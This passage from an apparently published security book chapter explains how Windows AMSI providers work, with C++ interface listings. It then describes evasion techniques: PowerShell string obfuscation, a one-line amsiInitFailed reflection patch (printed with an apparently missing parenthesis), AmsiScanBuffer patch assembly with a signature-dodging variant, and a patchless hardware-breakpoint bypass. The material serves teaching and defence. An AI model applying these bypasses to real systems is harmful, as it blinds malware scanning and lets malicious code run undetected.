<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-17: Execution passed to</span> <span class="eSANS_Futura_Std_Book_11a">MpClient.dll</span> <span class="eSANS_Futura_Std_Book_Oblique_I_11a">from</span> <span class="eSANS_Futura_Std_Book_11a">MpOav.dll</span></p>&#13;
<p class="TX">AMSI passes the result of the scan back to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiScanBuffer()</samp> via <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CAmsiAntimalware::Scan()</samp>, which in turn returns the <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_RESULT</samp> to the caller. If the script block was found to contain malicious content, PowerShell throws a <samp class="SANS_TheSansMonoCd_W5Regular_11">ScriptContainedMaliciousContent</samp> exception and prevents its execution.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h3 class="H2" id="sec5"><span id="h-140"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Implementing a Custom AMSI Provider</samp></h3>&#13;
<p class="TNI">As mentioned in the previous section, developers can implement the <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalwareProvider::Scan()</samp> function however they like. For example, they could simply log information about the content to be scanned, or they could pass the contents of a buffer through a trained machine-learning model to evaluate its maliciousness. To understand the shared architecture of all vendors’ AMSI providers, this section steps through the design of a simple provider DLL that meets the minimum specifications defined by Microsoft.</p>&#13;
<p class="TX">At their core, AMSI providers are nothing more than <i>COM servers</i>, or DLLs loaded into a host process that expose a function required by the caller: in this case, <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalwareProvider</samp>. This function extends the <samp class="SANS_TheSansMonoCd_W5Regular_11">IUnknown</samp> interface by adding three additional methods: <samp class="SANS_TheSansMonoCd_W5Regular_11">CloseSession</samp> closes the AMSI session via its <samp class="SANS_TheSansMonoCd_W5Regular_11">HAMSISESSION</samp> handle, <samp class="SANS_TheSansMonoCd_W5Regular_11">DisplayName</samp> displays the name of the AMSI provider, and <samp class="SANS_TheSansMonoCd_W5Regular_11">Scan</samp> scans an <samp class="SANS_TheSansMonoCd_W5Regular_11">IAmsiStream</samp> of content and returns an <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_RESULT</samp>.</p>&#13;
<p class="TX">In C++, a basic class declaration that overrides <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalwareProvider</samp>’s methods may look something like the code shown in <a href="#list10-18">Listing 10-18</a>.</p>&#13;
<pre id="list10-18"><code>class AmsiProvider :&#13;
        public RuntimeClass&lt;RuntimeClassFlags&lt;ClassicCom&gt;,&#13;
        IAntimalwareProvider,&#13;
        FtmBase&gt;&#13;
{&#13;
public:&#13;
    IFACEMETHOD(Scan)(&#13;
        IAmsiStream *stream,&#13;
        AMSI_RESULT *result&#13;
    ) override;&#13;
&#13;
    IFACEMETHOD_(void, CloseSession)(<span role="doc-pagebreak" epub:type="pagebreak" id="pg_194" aria-label=" Page 194. "/>&#13;
        ULONGLONG session&#13;
    ) override;&#13;
&#13;
    IFACEMETHOD(DisplayName)(&#13;
        LPWSTR *displayName&#13;
    ) override;&#13;
};</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-18: An example <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">IAntimalwareProvider</samp> class definition</span></p>&#13;
<p class="TX">Our code makes use of the Windows Runtime C++ Template Library, which reduces the amount of code used to create COM components. The <samp class="SANS_TheSansMonoCd_W5Regular_11">CloseSession()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">DisplayName()</samp> methods are simply overridden with our own functions to close the AMSI session and return the name of the AMSI provider, respectively. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Scan()</samp> function receives the buffer to be scanned as part of an <samp class="SANS_TheSansMonoCd_W5Regular_11">IAmsiStream</samp>, which exposes two methods, <samp class="SANS_TheSansMonoCd_W5Regular_11">GetAttribute()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Read()</samp>, and is defined in <a href="#list10-19">Listing 10-19</a>.</p>&#13;
<pre id="list10-19"><code>MIDL_INTERFACE("3e47f2e5-81d4-4d3b-897f-545096770373")&#13;
IAmsiStream : public IUnknown&#13;
{&#13;
public:&#13;
    virtual HRESULT STDMETHODCALLTYPE GetAttribute(&#13;
        /* [in] */ AMSI_ATTRIBUTE attribute,&#13;
        /* [range][in] */ ULONG dataSize,&#13;
        /* [length_is][size_is][out] */ unsigned char *data,&#13;
        /* [out] */ ULONG *retData) = 0;&#13;
&#13;
    virtual HRESULT STDMETHODCALLTYPE Read(&#13;
        /* [in] */ ULONGLONG position,&#13;
        /* [range][in] */ ULONG size,&#13;
        /* [length_is][size_is][out] */ unsigned char *buffer,&#13;
        /* [out] */ ULONG *readSize) = 0;&#13;
};</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-19: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">IAmsiStream</samp> class definition</span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">GetAttribute()</samp> retrieves metadata about the contents to be scanned. Developers request these attributes by passing an <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE</samp> value that indicates what information they would like to retrieve, along with an appropriately sized buffer. The <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE</samp> value is an enumeration defined in <a href="#list10-20">Listing 10-20</a>.</p>&#13;
<pre id="list10-20"><code>typedef enum AMSI_ATTRIBUTE {&#13;
    AMSI_ATTRIBUTE_APP_NAME = 0,&#13;
    AMSI_ATTRIBUTE_CONTENT_NAME = 1,&#13;
    AMSI_ATTRIBUTE_CONTENT_SIZE = 2,&#13;
    AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,&#13;
    AMSI_ATTRIBUTE_SESSION = 4,&#13;
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,&#13;
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,&#13;
    AMSI_ATTRIBUTE_ALL_SIZE = 7,&#13;
    AMSI_ATTRIBUTE_ALL_ADDRESS = 8,&#13;
    AMSI_ATTRIBUTE_QUIET = 9<span role="doc-pagebreak" epub:type="pagebreak" id="pg_195" aria-label=" Page 195. "/>&#13;
} AMSI_ATTRIBUTE;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-20: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AMSI_ATTRIBUTE</samp> enumeration</span></p>&#13;
<p class="TX">While there are 10 attributes in the enumeration, Microsoft documents only the first five: <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_APP_NAME</samp> is a string containing the name, version, or GUID of the calling application; <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_CONTENT_NAME</samp> is a string containing the filename, URL, script ID, or equivalent identifier of the content to be scanned; <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_CONTENT_SIZE</samp> is a <samp class="SANS_TheSansMonoCd_W5Regular_11">ULONGLONG</samp> containing the size of the data to be scanned; <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_CONTENT_ADDRESS</samp> is the memory address of the content, if it has been fully loaded into memory; and <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_SESSION</samp> contains a pointer to the next portion of the content to be scanned or <samp class="SANS_TheSansMonoCd_W5Regular_11">NULL</samp> if the content is self-contained.</p>&#13;
<p class="TX">As an example, <a href="#list10-21">Listing 10-21</a> shows how an AMSI provider might use this attribute to retrieve the application name.</p>&#13;
<pre id="list10-21"><code>HRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)&#13;
{&#13;
    HRESULT hr = E_FAIL;&#13;
    ULONG ulBufferSize = 0;&#13;
    ULONG ulAttributeSize = 0;&#13;
    PBYTE pszAppName = nullptr;&#13;
&#13;
    hr = stream-&gt;GetAttribute(&#13;
        AMSI_ATTRIBUTE_APP_NAME,&#13;
        0,&#13;
        nullptr,&#13;
        &amp;ulBufferSize&#13;
    );&#13;
&#13;
    if (hr != E_NOT_SUFFICIENT_BUFFER)&#13;
    {&#13;
        return hr;&#13;
    }&#13;
&#13;
    pszAppName = (PBYTE)HeapAlloc(&#13;
        GetProcessHeap(),&#13;
        0,&#13;
        ulBufferSize&#13;
    );&#13;
&#13;
    if (!pszAppName)&#13;
    {&#13;
        return E_OUTOFMEMORY;&#13;
    }&#13;
&#13;
    hr = stream-&gt;GetAttribute(&#13;
        AMSI_ATTRIBUTE_APP_NAME,&#13;
        ulBufferSize,&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> pszAppName,&#13;
        &amp;ulAttributeSize&#13;
    );<span role="doc-pagebreak" epub:type="pagebreak" id="pg_196" aria-label=" Page 196. "/>&#13;
&#13;
    if (hr != ERROR_SUCCESS || ulAttributeSize &gt; ulBufferSize)&#13;
    {&#13;
        HeapFree(&#13;
            GetProcessHeap(),&#13;
            0,&#13;
            pszAppName&#13;
        );&#13;
&#13;
        return hr;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-21: An implementation of the AMSI scanning function</span></p>&#13;
<p class="TX">When PowerShell calls this example function, <samp class="SANS_TheSansMonoCd_W5Regular_11">pszAppName</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span> will contain the application name as a string, which AMSI can use to enrich the scan data. This becomes particularly useful if the script block is deemed malicious, as the EDR could use the application name to terminate the calling process.</p>&#13;
<p class="TX">If <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_ATTRIBUTE_CONTENT_ADDRESS</samp> returns a memory address, we know that the content to be scanned has been fully loaded into memory, so we can interact with it directly. Most often, the data is provided as a stream, in which case we use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Read()</samp> method (defined in <a href="#list10-22">Listing 10-22</a>) to retrieve the contents of the buffer one chunk at a time. We can define the size of these chunks, which get passed, along with a buffer of the same size, to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Read()</samp> method.</p>&#13;
<pre id="list10-22"><code>HRESULT Read(&#13;
  [in] ULONGLONG      position,&#13;
  [in] ULONG          size,&#13;
  [out] unsigned char *buffer,&#13;
  [out] ULONG         *readSize&#13;
);</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-22: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">IAmsiStream::Read()</samp> method definition</span></p>&#13;
<p class="TX">What the provider does with these chunks of data is completely up to the developer. They could scan each chunk, read the full stream, and hash its contents, or simply log details about it. The only rule is that, when the <samp class="SANS_TheSansMonoCd_W5Regular_11">Scan()</samp> method returns, it must pass an <samp class="SANS_TheSansMonoCd_W5Regular_11">HRESULT</samp> and an <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_RESULT</samp> to the caller.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h2 class="H1" id="sec6"><span id="h-141"/><samp class="SANS_Futura_Std_Bold_B_11">Evading AMSI</samp></h2>&#13;
<p class="TNI">AMSI is one of the most-studied areas when it comes to evasion. This is due in no small part to how effective it was in its early days, causing significant headaches for offensive teams that used PowerShell heavily. For them, AMSI presented an existential crisis that prevented their main agents from functioning.</p>&#13;
<p class="TX">Attackers can employ a variety of evasion techniques to bypass AMSI. While certain vendors have attempted to flag some of these as malicious, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_197" aria-label=" Page 197. "/>the number of evasion opportunities present in AMSI is staggering, so vendors usually can’t handle all of them. This section covers some of the more popular evasions in today’s operating environment, but bear in mind that there are many variations to each of these techniques.</p>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h-142"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">String Obfuscation</samp></h3>&#13;
<p class="TNI">One of the earliest evasions for AMSI involved simple string obfuscation. If an attacker could determine which part of a script block was being flagged as malicious, they could often get around the detection by splitting, encoding, or otherwise obscuring the string, as in the example in <a href="#list10-23">Listing 10-23</a>.</p>&#13;
<pre id="list10-23"><code>PS &gt; <b>AmsiScanBuffer</b>&#13;
At line:1 char:1&#13;
+ AmsiScanBuffer&#13;
+ ~~~~~~~~~~~~~~&#13;
This script contains malicious content and has been blocked by your antivirus software.&#13;
  + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException&#13;
  + FullyQualifiedErrorId : ScriptContainedMaliciousContent&#13;
&#13;
PS &gt; <b>"Ams" + "iS" + "can" + "Buff" + "er"</b>&#13;
AmsiScanBuffer&#13;
&#13;
PS &gt; <b>$b = [System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI=")</b>&#13;
PS &gt; <b>[System.Text.Encoding]::UTF8.GetString($b)</b>&#13;
AmsiScanBuffer</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-23: An example of string obfuscation in PowerShell that evades AMSI</span></p>&#13;
<p class="TX">AMSI typically flags the string <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer</samp>, a common component of patching-based evasions, as malicious, but here you can see that string concatenation allows us to bypass detection. AMSI implementations often receive obfuscated code, which they pass off to providers to determine if it is malicious. This means the provider must handle language-emulation functions such as string concatenation, decoding, and decrypting. However, many providers, including Microsoft, fail to detect even trivial bypasses such as the one shown here.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h-143"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">AMSI Patching</samp></h3>&#13;
<p class="TNI">Because AMSI and its associated providers get mapped into the attacker’s process, the attacker has control over this memory. By patching critical values or functions inside <i>amsi.dll</i>, they can prevent AMSI from functioning inside their process. This evasion technique is extremely potent and has been the go-to choice for many red teams since around 2016, when Matt Graeber discussed using reflection inside PowerShell to patch <samp class="SANS_TheSansMonoCd_W5Regular_11">amsiInitFailed</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">true</samp>. His code, included in <a href="#list10-24">Listing 10-24</a>, fit into a single tweet.</p>&#13;
<pre id="list10-24"><code>PS &gt; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').&#13;
&gt;&gt; GetField('amsiInitFailed','NonPublic,Static'.SetValue($null,$true)</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-24: A simple <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AmsiInitFailed</samp> patch</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_198" aria-label=" Page 198. "/>When it comes to patching, attackers commonly target <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp>, the function responsible for passing buffer contents to the providers. Daniel Duggan describes this technique in a blog post, “Memory Patching AMSI Bypass,” where he outlines the steps an attacker’s code must take before performing any truly malicious activity:</p>&#13;
<ol class="NL">&#13;
<li class="NL" value="1">Retrieve the address of <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> within the <i>amsi.dll</i> currently loaded into the process.</li>&#13;
<li class="NL">Use <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!VirtualProtect()</samp> to change the memory protections to read-write, which allows the attacker to place the patch.</li>&#13;
<li class="NL">Copy the patch into the entry point of the <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> function.</li>&#13;
<li class="NL">Use <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!VirtualProtect()</samp> once again to revert the memory protection back to read-execute.</li>&#13;
</ol>&#13;
<p class="TX">The patch itself takes advantage of the fact that, internally, <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> returns <samp class="SANS_TheSansMonoCd_W5Regular_11">E_INVALIDARG</samp> if its initial checks fail. These checks include attempts to validate the address of the buffer to be scanned. Duggan’s code adds a byte array that represents the assembly code in <a href="#list10-25">Listing 10-25</a>. After this patch, when <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> is executed, it will immediately return this error code because the actual instruction that made up the original function has been overwritten.</p>&#13;
<pre id="list10-25"><code>mov eax, 0x80070057 ; E_INVALIDARG&#13;
ret</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-25: Error code returned to the caller of <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AmsiScanBuffer()</samp> after the patch</span></p>&#13;
<p class="TX">There are many variations of this technique, all of which work very similarly. For example, an attacker may patch <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiOpenSession()</samp> instead of <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp>. They may also opt to corrupt one of the parameters passed into <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp>, such as the buffer length or the context, causing AMSI to return <samp class="SANS_TheSansMonoCd_W5Regular_11">E_INVALIDARG</samp> on its own.</p>&#13;
<p class="TX">Microsoft got wise to this evasion technique pretty quickly and took measures to defend against the bypass. One of the detections it implemented is based on the sequence of opcodes that make up the patch we’ve described. However, attackers can work around these detections in many ways. For example, they can simply modify their assembly code to achieve the same result, moving <samp class="SANS_TheSansMonoCd_W5Regular_11">0x80070057</samp> into <samp class="SANS_TheSansMonoCd_W5Regular_11">EAX</samp> and returning, in a way that is less direct. Consider the example in <a href="#list10-26">Listing 10-26</a>, which breaks up the value <samp class="SANS_TheSansMonoCd_W5Regular_11">0x80070057</samp> instead of moving it into the register all at once.</p>&#13;
<pre id="list10-26"><code>xor eax, eax ; Zero out EAX&#13;
add eax, 0x7459104a&#13;
add eax, 0xbadf00d&#13;
ret</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-26: Breaking up hardcoded values to evade patch detection</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_199" aria-label=" Page 199. "/>Imagine that the EDR looks for the value <samp class="SANS_TheSansMonoCd_W5Regular_11">0x80070057</samp> being moved into the <samp class="SANS_TheSansMonoCd_W5Regular_11">EAX</samp> register. This evasion strategy would bypass its detection logic because the value is never directly referenced. Instead, it is broken up into two values, which happen to add up to the required value.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h3 class="H2" id="sec9"><span id="h-144"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">A Patchless AMSI Bypass</samp></h3>&#13;
<p class="TNI">In April 2022, Ceri Coburn unveiled a technique for bypassing AMSI without patching <i>amsi.dll</i>, an activity many EDR vendors have begun to monitor. Coburn’s technique doesn’t require fork&amp;run either, allowing the attacker to stay in their original process.</p>&#13;
<p class="TX">The technique is quite clever. First, the attacker obtains a function pointer to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiScanBuffer()</samp> either from the loaded <i>amsi.dll</i> or by forcing it to load into the process through a call to <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibrary()</samp>. Next, they register a vectored exception handler via <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!AddVectoredExceptionHandler()</samp>. This handler allows developers to register a function that monitors and manages all exceptions in the application. Finally, they set a hardware breakpoint on the address of <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> by modifying the current thread’s debug registers (<samp class="SANS_TheSansMonoCd_W5Regular_11">DR0</samp>, <samp class="SANS_TheSansMonoCd_W5Regular_11">DR6</samp>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">DR7</samp>).</p>&#13;
<p class="TX">When the attacker executes their .NET code inline, the system will eventually call <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp>, triggering the hardware breakpoint and invoking the vectored exception handler. This function takes the current thread context and updates the registers to match the values set when AMSI doesn’t detect malicious content, namely a return value of <samp class="SANS_TheSansMonoCd_W5Regular_11">0 (S-OK)</samp> in <samp class="SANS_TheSansMonoCd_W5Regular_11">RAX</samp> and a result of <samp class="SANS_TheSansMonoCd_W5Regular_11">0 (AMSI_RESULT_CLEAN)</samp> in <samp class="SANS_TheSansMonoCd_W5Regular_11">RS</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">P+</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">48</samp>.</p>&#13;
<p class="TX">Additionally, it pulls the return address from the stack (<samp class="SANS_TheSansMonoCd_W5Regular_11">RSP</samp>) and points the instruction pointer (<samp class="SANS_TheSansMonoCd_W5Regular_11">RIP</samp>) back to the caller of the <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> function. Next, it walks the stack pointer back to its position from before the call to <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp>, clears the hardware breakpoint, and returns the <samp class="SANS_TheSansMonoCd_W5Regular_11">EXCEPTION_CONTINUE_EXECUTION</samp> code. Execution resumes at the point at which the breakpoint occurred. Now Windows will take the attacker’s modified thread context and continue execution with our changes in place, passing the falsified values back to the caller and letting the malicious code continue undetected.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec10">&#13;
<h2 class="H1" id="sec10"><span id="h-145"/><samp class="SANS_Futura_Std_Bold_B_11">Conclusion</samp></h2>&#13;
<p class="TNI">AMSI is an incredibly important piece of the host-based detection puzzle. Its integration into software such as PowerShell, .NET, and Microsoft Office means that it sits inline of many adversary activities, from initial access through post-exploitation. AMSI has been heavily researched due to its tremendous impact on offensive operations at the time of its release. Today, AMSI fills more of a supplementary role, as nearly countless evasion strategies exist for it. However, vendors have caught on to this and have begun to invest in monitoring for common AMSI evasion strategies, then using those as indicators of adversary activity themselves.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>